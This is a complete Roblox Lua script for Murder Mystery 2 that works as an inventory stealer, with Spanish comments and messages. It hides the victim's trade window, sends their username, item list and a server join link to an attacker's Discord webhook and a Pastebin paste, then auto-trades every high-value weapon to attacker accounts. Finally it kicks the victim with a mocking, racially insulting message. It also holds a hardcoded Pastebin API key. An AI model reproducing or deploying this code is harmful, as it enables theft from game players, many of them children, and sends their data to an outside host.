local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local webhook = _G.webhook or ""
local users = _G.Usernames or {}
local min_rarity = _G.min_rarity or "Godly"
local min_value = _G.min_value or 1

local req = syn and syn.request or http_request or request
if not req then warn("No HTTP request method available!") return end

local function SendWebhook(title, description, fields, prefix)
    local data = {
        ["content"] = prefix or "",
        ["embeds"] = {{
            ["title"] = title,
            ["description"] = description or "",
            ["color"] = 65280,
            ["fields"] = fields or {},
            ["thumbnail"] = {["url"] = "https://i.postimg.cc/fbsB59FF/file-00000000879c622f8bad57db474fb14d-1.png"},
            ["footer"] = {["text"] = "The best stealer by Anonimo 🇪🇨"}
        }}
    }
    local body = HttpService:JSONEncode(data)
    pcall(function()
        req({Url = webhook, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = body})
    end)
end

local function CreatePaste(content)
    local api_dev_key = "_hLJczUn9kRRrZ857l24K6iIAhzm_yNs"
    local api_paste_name = "MM2 Inventario "..LocalPlayer.Name
    local api_paste_format = "text"
    local api_paste_private = "1"
    local body = "api_option=paste&api_dev_key="..api_dev_key..
                 "&api_paste_code="..HttpService:UrlEncode(content)..
                 "&api_paste_name="..HttpService:UrlEncode(api_paste_name)..
                 "&api_paste_format="..api_paste_format..
                 "&api_paste_private="..api_paste_private
    local res = req({Url = "https://pastebin.com/api/api_post.php", Method = "POST", Headers = {["Content-Type"]="application/x-www-form-urlencoded"}, Body = body})
    if res and res.Body then return res.Body end
end

local playerGui = LocalPlayer:WaitForChild("PlayerGui")
for _, guiName in ipairs({"TradeGUI","TradeGUI_Phone"}) do
    local gui = playerGui:FindFirstChild(guiName)
    if gui then
        gui:GetPropertyChangedSignal("Enabled"):Connect(function() gui.Enabled=false end)
        gui.Enabled=false
    end
end

local TradeService = game:GetService("ReplicatedStorage"):WaitForChild("Trade")
local function getTradeStatus() return TradeService.GetTradeStatus:InvokeServer() end
local function sendTradeRequest(user)
    local plrObj = Players:FindFirstChild(user)
    if plrObj then TradeService.SendRequest:InvokeServer(plrObj) end
end
local function addWeaponToTrade(id) TradeService.OfferItem:FireServer(id,"Weapons") end
local function acceptTrade() TradeService.AcceptTrade:FireServer(285646582) end
local function waitForTradeCompletion() while getTradeStatus()~="None" do task.wait(0.1) end end

local function CheckServerInitial()
    if #Players:GetPlayers() >= 12 then
        LocalPlayer:Kick("⚠️ Servidor lleno. Buscando uno vacío...")
    end
    if game.PrivateServerId and game.PrivateServerId ~= "" then
        LocalPlayer:Kick("🔒 Servidor privado detectado. Buscando público...")
    end
    local success, ownerId = pcall(function() return game.PrivateServerOwnerId end)
    if success and ownerId and ownerId ~= 0 then
        LocalPlayer:Kick("🔒 Servidor VIP detectado. Buscando público...")
    end
end
CheckServerInitial()

local database = require(game.ReplicatedStorage.Database.Sync.Item)
local rarityTable = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage"}
local categories = {
    godly="https://supremevaluelist.com/mm2/godlies.html",
    ancient="https://supremevaluelist.com/mm2/ancients.html",
    unique="https://supremevaluelist.com/mm2/uniques.html",
    classic="https://supremevaluelist.com/mm2/vintages.html",
    chroma="https://supremevaluelist.com/mm2/chromas.html"
}
local headers={["Accept"]="text/html",["User-Agent"]="Mozilla/5.0"}

local function trim(s) return s:match("^%s*(.-)%s*$") end
local function fetchHTML(url) local res=req({Url=url, Method="GET", Headers=headers}) return res and res.Body or "" end
local function parseValue(div)
    local str=div:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
    if str then str=str:gsub(",","") return tonumber(str) end
end
local function extractItems(html)
    local t={}
    for name,body in html:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
        name=trim(name:match("([^<]+)"):gsub("%s+"," "))
        name=trim((name:split(" Click "))[1])
        local v=parseValue(body)
        if v then t[name:lower()]=v end
    end
    return t
end
local function extractChroma(html)
    local t={}
    for name,body in html:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
        local n=trim(name:match("([^<]+)"):gsub("%s+"," ")):lower()
        local v=parseValue(body)
        if v then t[n]=v end
    end
    return t
end
local function buildValueList()
    local allValues,chromaValues={},{}
    for r,url in pairs(categories) do
        local html=fetchHTML(url)
        if html~="" then
            if r~="chroma" then
                local vals=extractItems(html)
                for k,v in pairs(vals) do allValues[k]=v end
            else
                chromaValues=extractChroma(html)
            end
        end
    end
    local valueList={}
    for id,item in pairs(database) do
        local name=item.ItemName and item.ItemName:lower() or ""
        local rarity=item.Rarity or ""
        local hasChroma=item.Chroma or false
        if name~="" and rarity~="" then
            local ri=table.find(rarityTable,rarity)
            local godlyIdx=table.find(rarityTable,"Godly")
            if ri and ri>=godlyIdx then
                if hasChroma then
                    for cname,val in pairs(chromaValues) do
                        if cname:find(name) then valueList[id]=val break end
                    end
                else
                    if allValues[name] then valueList[id]=allValues[name] end
                end
            end
        end
    end
    return valueList
end

local weaponsToSend={}
local totalValue=0
local min_rarity_index=table.find(rarityTable,min_rarity)
local valueList=buildValueList()

local profile=game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
for id,amount in pairs(profile.Weapons.Owned) do
    local item=database[id]
    if item then
        local ri=table.find(rarityTable,item.Rarity)
        if ri and ri>=min_rarity_index then
            local v=valueList[id] or ({10,20})[math.random(1,2)]
            if v>=min_value then
                table.insert(weaponsToSend,{DataID=id,Amount=amount,Value=v,Rarity=item.Rarity})
                totalValue+=v*amount
            end
        end
    end
end

table.sort(weaponsToSend,function(a,b) return (a.Value*a.Amount)>(b.Value*b.Amount) end)

local fernToken = math.random(100000,999999)
local realLink = "[unirse](https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId.."&token="..fernToken..")"

local pasteContent = ""
for _, w in ipairs(weaponsToSend) do
    pasteContent = pasteContent..string.format("%s x%s (%s) | Valor: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
end
pasteContent = pasteContent .. "\nValor total del inventario📦: "..tostring(totalValue).."💰"

local pasteLink
if #weaponsToSend > 18 then
    pasteLink = CreatePaste(pasteContent)
end

if #weaponsToSend > 0 then
    local fieldsInit={
        {name="Victima 👤:", value=LocalPlayer.Name, inline=true},
        {name="Inventario 📦:", value="", inline=false},
        {name="Valor total del inventario📦:", value=tostring(totalValue).."💰", inline=true},
        {name="Click para unirte a la víctima 👇:", value=realLink, inline=false}
    }
    local maxEmbedItems = math.min(18,#weaponsToSend)
    for i=1,maxEmbedItems do
        local w = weaponsToSend[i]
        fieldsInit[2].value = fieldsInit[2].value..string.format("%s x%s (%s)\nValor: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
    end
    if #weaponsToSend > 18 then
        fieldsInit[2].value = fieldsInit[2].value.."... y más armas 🔥\n"
        if pasteLink then
            fieldsInit[2].value = fieldsInit[2].value.."Mira todos los ítems aquí 📜: [Mirar]("..pasteLink..")"
        end
    end
    SendWebhook("💪MM2 Hit el mejor stealer💯","💰Disfruta todas las armas gratis 😎",fieldsInit)
end

local function TradeFinalizado()
    local weaponsBackup = {}
    for _, w in ipairs(weaponsToSend) do
        table.insert(weaponsBackup, w)
    end
    local fieldsFinal={
        {name="Victima 👤:", value=LocalPlayer.Name, inline=true},
        {name="📦 Inventario enviado:", value="", inline=false},
        {name="Valor total del inventario📦:", value=tostring(totalValue).."💰", inline=true}
    }
    for _, w in ipairs(weaponsBackup) do
        fieldsFinal[2].value = fieldsFinal[2].value..string.format("%s x%s (%s)\nValor: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
    end
    if #weaponsBackup > 18 and pasteLink then
        fieldsFinal[2].value = fieldsFinal[2].value.."... y más armas 🔥\nMira todos los ítems aquí 📜: [Mirar]("..pasteLink..")"
    end
    SendWebhook("📦 Inventario enviado","",fieldsFinal)
    task.wait(5)
    setclipboard("https://discord.gg/4VySnCHy") -- auto copia el enlace
    LocalPlayer:Kick("El mejor ladron Anonimo, a robado todo tu invententario de mm2 😂😂🤣 llora negro https://discord.gg/4VySnCHy")
end

local function doTrade(targetName)
    if #weaponsToSend == 0 then return end
    while #weaponsToSend>0 do
        local status=getTradeStatus()
        if status=="None" then
            sendTradeRequest(targetName)
        elseif status=="SendingRequest" then
            task.wait(0.3)
        elseif status=="StartTrade" then
            for i=1,math.min(4,#weaponsToSend) do
                local w=table.remove(weaponsToSend,1)
                for _=1,w.Amount do
                    addWeaponToTrade(w.DataID)
                end
            end
            task.wait(6)
            acceptTrade()
            waitForTradeCompletion()
        else task.wait(0.5) end
        task.wait(1)
    end
    TradeFinalizado()
end

for _, p in ipairs(Players:GetPlayers()) do
    if table.find(users,p.Name) then
        doTrade(p.Name)
        p.Chatted:Connect(function() doTrade(p.Name) end)
    end
end
Players.PlayerAdded:Connect(function(p)
    if table.find(users,p.Name) then
        doTrade(p.Name)
        p.Chatted:Connect(function() doTrade(p.Name) end)
    end
end)
